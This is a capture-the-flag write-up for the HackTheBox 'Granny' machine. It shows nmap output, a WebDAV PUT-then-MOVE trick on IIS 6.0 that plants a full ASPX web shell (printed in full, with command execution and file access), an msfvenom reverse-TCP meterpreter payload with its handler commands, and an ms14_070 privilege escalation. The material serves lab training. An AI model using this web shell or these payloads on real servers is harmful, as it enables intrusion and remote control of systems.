# Granny

The granny is simple hackthebox in which we will exploit the improper permissions on the HTTP methods to get **RCE** and then leverage it with malicious **ASPX** file to gain the meterpreter session. For privilege escalation we will use windows  **CVE ms14_070_tcpip_ioctl**. So lets get started

## Nmap

we start with the nmap scan for to find all the port. Also i will run a nmap scan for all ports in background to have some enumeration running in the background.

```bash
nmap -sC -sV -oN nmap/granny 10.10.10.15
```

nmap scan for all ports in background

```
nmap -p- -v -oN nmap/allports 10.10.10.15
```

we get output of the first nmap scan as follows

```
# Nmap 7.80 scan initiated Mon Mar 16 10:25:07 2020 as: nmap -sC -sV -oN nmap/granny 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.20s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Mon, 16 Mar 2020 04:55:28 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 16 10:25:33 2020 -- 1 IP address (1 host up) scanned in 25.73 seconds
```

we have only one port open i.e 80. Checking it out we have nothing but a **Under Construction Page** there. On further analysing the nmap output, we see the HTTP methods such as **DELETE, COPY, MOVE, PUT** are open to public users. Lets examine them.

## Getting Shell

The public PUT allows us the to upload html files. Thus the following request allows us to upload html files but not the aspx files. This does us no good unless we can leverage to upload aspx files.

### Note

I had take the shell.aspx file from [here]([https://raw.githubusercontent.com/xl7dev/WebShell/master/Aspx/ASPX%20Shell.aspx](https://raw.githubusercontent.com/xl7dev/WebShell/master/Aspx/ASPX Shell.aspx))

We are trying to upload aspx files not php files to gain **RCE** as this is windows box and server is WebDAV so safe guess is php is not installed on the box and will not be executed by the server.

We see that we have HTTP methods such as MOVE also, so if we could upload a html file and move it file with aspx extension that will solve our problem. So upload the aspx file as shell.html and then move it shell.aspx.

```http
PUT /shell.html HTTP/1.1
Host: 10.10.10.15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
Content-Length: 5271

<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
	string outstr = "";
	
	// get pwd
	string dir = Page.MapPath(".") + "/";
	if (Request.QueryString["fdir"] != null)
		dir = Request.QueryString["fdir"] + "/";
	dir = dir.Replace("\\", "/");
	dir = dir.Replace("//", "/");
	
	// build nav for path literal
	string[] dirparts = dir.Split('/');
	string linkwalk = "";	
	foreach (string curpart in dirparts)
	{
		if (curpart.Length == 0)
			continue;
		linkwalk += curpart + "/";
		outstr += string.Format("<a href='?fdir={0}'>{1}/</a>&nbsp;",
									HttpUtility.UrlEncode(linkwalk),
									HttpUtility.HtmlEncode(curpart));
	}
	lblPath.Text = outstr;
	
	// create drive list
	outstr = "";
	foreach(DriveInfo curdrive in DriveInfo.GetDrives())
	{
		if (!curdrive.IsReady)
			continue;
		string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
		outstr += string.Format("<a href='?fdir={0}'>{1}</a>&nbsp;",
									HttpUtility.UrlEncode(driveRoot),
									HttpUtility.HtmlEncode(driveRoot));
	}
	lblDrives.Text = outstr;

	// send file ?
	if ((Request.QueryString["get"] != null) && (Request.QueryString["get"].Length > 0))
	{
		Response.ClearContent();
		Response.WriteFile(Request.QueryString["get"]);
		Response.End();
	}

	// delete file ?
	if ((Request.QueryString["del"] != null) && (Request.QueryString["del"].Length > 0))
		File.Delete(Request.QueryString["del"]);	

	// receive files ?
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt >= 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
	}

	// enum directory and generate listing in the right pane
	DirectoryInfo di = new DirectoryInfo(dir);
	outstr = "";
	foreach (DirectoryInfo curdir in di.GetDirectories())
	{
		string fstr = string.Format("<a href='?fdir={0}'>{1}</a>",
									HttpUtility.UrlEncode(dir + "/" + curdir.Name),
									HttpUtility.HtmlEncode(curdir.Name));
		outstr += string.Format("<tr><td>{0}</td><td>&lt;DIR&gt;</td><td></td></tr>", fstr);
	}
	foreach (FileInfo curfile in di.GetFiles())
	{
		string fstr = string.Format("<a href='?get={0}' target='_blank'>{1}</a>",
									HttpUtility.UrlEncode(dir + "/" + curfile.Name),
									HttpUtility.HtmlEncode(curfile.Name));
		string astr = string.Format("<a href='?fdir={0}&del={1}'>Del</a>",
									HttpUtility.UrlEncode(dir),
									HttpUtility.UrlEncode(dir + "/" + curfile.Name));
		outstr += string.Format("<tr><td>{0}</td><td>{1:d}</td><td>{2}</td></tr>", fstr, curfile.Length / 1024, astr);
	}
	lblDirOut.Text = outstr;

	// exec cmd ?
	if (txtCmdIn.Text.Length > 0)
	{
		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = dir;
		p.Start();

		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		txtCmdIn.Text = "";
	}	
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title>ASPX Shell</title>
	<style type="text/css">
		* { font-family: Arial; font-size: 12px; }
		body { margin: 0px; }
		pre { font-family: Courier New; background-color: #CCCCCC; }
		h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
		h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
		th { text-align: left; background-color: #99CC99; }
		td { background-color: #CCFFCC; }
		pre { margin: 2px; }
	</style>
</head>
<body>
	<h1>ASPX Shell by LT</h1>
    <form id="form1" runat="server">
    <table style="width: 100%; border-width: 0px; padding: 5px;">
		<tr>
			<td style="width: 50%; vertical-align: top;">
				<h2>Shell</h2>				
				<asp:TextBox runat="server" ID="txtCmdIn" Width="300" />
				<asp:Button runat="server" ID="cmdExec" Text="Execute" />
				<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
			</td>
			<td style="width: 50%; vertical-align: top;">
				<h2>File Browser</h2>
				<p>
					Drives:<br />
					<asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" />
				</p>
				<p>
					Working directory:<br />
					<b><asp:Literal runat="server" ID="lblPath" Mode="passThrough" /></b>
				</p>
				<table style="width: 100%">
					<tr>
						<th>Name</th>
						<th>Size KB</th>
						<th style="width: 50px">Actions</th>
					</tr>
					<asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" />
				</table>
				<p>Upload to this directory:<br />
				<asp:FileUpload runat="server" ID="flUp" />
				<asp:Button runat="server" ID="cmdUpload" Text="Upload" />
				</p>
			</td>
		</tr>
    </table>

    </form>
</body>
</html>
```

Now moving the file

```http
MOVE /shell.html HTTP/1.1
DESTINATION: http://10.10.10.15/shell.aspx
Host: 10.10.10.15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close
```

Now if we go to http://10.10.10.15/shell.aspx we should get our shell. As shown below.

![We got our shell](/home/duckie/Documents/htb/hackthebox_writeups/Hackthebox/granny/file_upload_granny.png)

With the help of the msfvenom we will get out meterpreter shell now. The following command will create a staged meterpreter payload in aspx format.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=4444 -f aspx -o nice.aspx
```

Fire up the meterpreter and run the commands

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.4
set LPORT 4444
run
```

make a get request to http://10.10.10.15/nice.aspx and you should a meterpreter shell. 

## Privilege Escalation

We have the SeImpersonateToken available to us so the logical path is to Juicy Potato, Dirty Potato or some potato this box (too many potato exploits, smh). But they did'nt worked for me. With Fuck-Ton of searching around gave me this exploit **ms14_070_tcpip_ioctl** , so i ran up the msf exploit for this and it gave me a system shell. yay!

![proof.txt](/home/duckie/Documents/htb/hackthebox_writeups/Hackthebox/granny/granny_proof.png)

So that was the granny box, i am doing all the OSCP similar boxes on the hackthebox and will be writing stuff on them.